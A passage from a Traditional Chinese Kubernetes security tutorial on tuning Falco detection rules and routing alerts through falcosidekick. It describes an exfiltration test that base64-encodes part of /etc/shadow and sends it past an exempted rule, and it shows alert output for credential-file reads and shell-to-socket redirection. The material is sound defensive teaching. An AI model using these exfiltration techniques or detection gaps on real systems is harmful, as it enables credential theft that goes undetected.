2. **對被豁免的 Service 的 8080 完全開放。** 上面那行把 `/etc/shadow` 的前 24 個位元組 base64 之後塞進查詢字串送出去,規則 A 沒有任何反應。

**但訊號沒有完全消失**,這一點要一起講,否則就變成危言聳聽:

```text
Warning  Read sensitive file untrusted                            proc=head  file=/etc/shadow
Notice   Redirect STDOUT/STDIN to Network Connection in Container  proc=bash  fd.sip=10.0.47.134
```

預設規則接住了**這一次**——因為剛好讀了 `/etc/shadow`,又剛好把 fd 重導到 socket。換一個場景:一支本來就有資料庫連線的應用被植入邏輯,把查到的資料經由被豁免的對端送出去——**沒有敏感檔案被開、沒有 fd 重導、規則 A 被豁免**,三條線全部安靜。

**教訓**:這就是為什麼「調校沒付出代價,就代表規則本來沒用」。一條真正在防守的規則,調校時一定要在某個地方付出偵測力;**你的工作不是把代價變成零,是把代價講清楚、寫進例外的名字裡、然後定期回來問它還需不需要。**

### 地雷 6:sidekick 預設兩份副本、不給 resources,而且會擠在同一顆節點上 {#mine-6}

```console
$ kubectl -n falco get pods -l app.kubernetes.io/name=falcosidekick \
    -o custom-columns=NAME:.metadata.name,NODE:.spec.nodeName,PRIO:.spec.priority
falco-falcosidekick-5f96d6d856-5zd7s   <node-b>   0
falco-falcosidekick-5f96d6d856-8k4mt   <node-b>   0
```

三件事同時發生:

1. **`replicaCount` 預設是 2**,沒人告訴你。在一座「加裝 Falco 就把 system 節點擠爆」的叢集上,這是多出來的一倍。
2. **chart 預設完全不給 `resources`**。不給 requests 的 pod 是 **BestEffort**,節點記憶體吃緊時是第一個被 OOM kill 的——**告警管線是整個系統裡最不該用 BestEffort 跑的東西**。
3. **兩顆都排到同一顆節點**,chart 沒有 pod anti-affinity。那顆節點沒了,兩份副本一起沒,`replicaCount: 2` 提供的可用性是零。

priority 一樣是 0,跟 [Day 3 地雷 1](sprint2-day3-falco-basics.md#mine-1) 是同一個家族。但**後果不一樣**:Falco 被踢掉是「少看到事件」,sidekick 被踢掉是「事件照抓、但沒人收到」——後者從任何健康指標上都看不出來。

**修法**:手動補上 `resources`、視情況調 `replicaCount`、加 pod anti-affinity。這三項都要自己寫,chart 一個都沒給。

### 地雷 7:把沒調校的規則接上路由,等於把問題放大送出去 {#mine-7}

接收端收到的 964 筆,按規則分:

```console
   956  Unexpected outbound connection from lab workload
     3  Shell spawned by non-runtime parent in container
     2  Terminal shell in container
     2  Redirect STDOUT/STDIN to Network Connection in Container
     1  Read sensitive file untrusted
```

**956/964 = 99.2% 是同一條規則調校前的誤報。** 真正該看的 8 筆,散落在裡面。

這個數字有兩層意義:

- **順序錯了。** 本章的順序是先接路由、後調校,所以誤報全被忠實地送到下游。**正確的順序是先讓規則在標準輸出上安靜下來,再接路由**——標準輸出是免費的,下游不是(值班頻道被洗版、呼叫器半夜叫人、日誌平台的 ingest 帳單)。
- **步驟 3 那次無終端機的 web shell 測試就是活生生的例子**:那 12 秒的窗口裡,1 筆真告警配 36 筆誤報。**如果那 36 筆已經被路由到值班頻道,沒有人會看見那 1 筆。**

**教訓**:誤報不只是「吵」——**它是把真訊號藏起來的機制。**

## 帶得走的東西

- **調校沒付出代價,就代表規則本來沒在守什麼。** 一條真正在防守的規則,把誤報壓下去時一定要在某個地方交出偵測力。工作不是把代價變成零,是把代價量出來、寫進例外的名字裡、定期回來問它還需不需要。
- **在 Kubernetes 上估事件率,要先把 DNS 放大算進去。** `ndots:5` 加三個 search domain,讓一次 HTTP 請求變成六次 `connect()`。這個倍數是叢集設定決定的,換個 namespace 就變——用「應用每秒幾個請求」去推規則會吵多大聲,一定低估。
- **複用預設 macro 之前要把它展開讀完。** 預設的 `outbound` 排除了整個私有網段,拿來用可以讓誤報一夕歸零,代價是叢集內的橫向移動整類行為從此看不見。看起來免費的調校最危險。
- **`helm` 說成功,不等於規則生效。** 唯一可信的是 Falco pod 自己的啟動日誌:規則檔那一行要在、而且後面不能跟著 warning 區塊。淘汰的欄位會讓一條規則永遠不報,而所有健康指標全綠。
- **告警管線多一段,就多一個「偵測正常但沒人知道」的位置。** Falco 是 DaemonSet,掛一顆只影響一顆節點;sidekick 是 Deployment,是整條鏈上唯一的集中點,而它預設跑在 BestEffort、沒有反親和性、priority 0。

## 延伸閱讀

想往下深挖,從這幾份開始:

- **[規則例外(exceptions)的官方說明](https://falco.org/docs/concepts/rules/exceptions/)** —— `fields`／`comps`／`values` 三者怎麼組成一段自動接在 `condition` 後面的 `and not`,以及覆寫時 `append` 與 `replace` 的差別,對得上步驟 4 的調校。
- **[Pod 的 DNS 設定與 ndots](https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/)** —— Kubernetes 官方文件明載 pod 的 `search` 清單與 `options ndots:5`,這是地雷 4 那個六倍放大的一手來源。
- **[Falco 規則的覆寫與追加語法](https://falco.org/docs/concepts/rules/overriding/)** —— 同名規則怎麼整條取代、只追加條件、或只追加例外值;多團隊共用規則庫時這一頁是分工的基礎。
- **[Falco Helm chart 的參數表](https://github.com/falcosecurity/charts/tree/master/charts/falco)** —— `customRules` 的形狀(檔名對內容的 map)、`falcosidekick` 子 chart 的開關與預設值都在這裡。
- **[Falcosidekick 專案 README](https://github.com/falcosecurity/falcosidekick)** —— 扇出的完整目的地清單(七十多種),接真實環境時從這份挑。

## 下一步

Falco 到這裡告一段落:預設規則讀過了、兩個洞補起來了、誤報的帳算過了、告警也送得出節點。它的形狀很清楚——**在使用者空間比對規則,報給人看**。

[Day 5](sprint2-day5-tetragon-basics.md) 換 Tetragon 上場,它的形狀不一樣:規則寫成 Kubernetes 的自訂資源,而且**過濾可以留在核心裡**——這讓它多出一件 Falco 做不到的事。今天寫的兩條規則會留在叢集上當基準,Day 5 之後的對照都以「25 條預設加 2 條自訂」為準。

---

!!! quote ""
    Falco 標誌為 Falco 專案之官方資產(CNCF artwork),此處作社群教學用途。
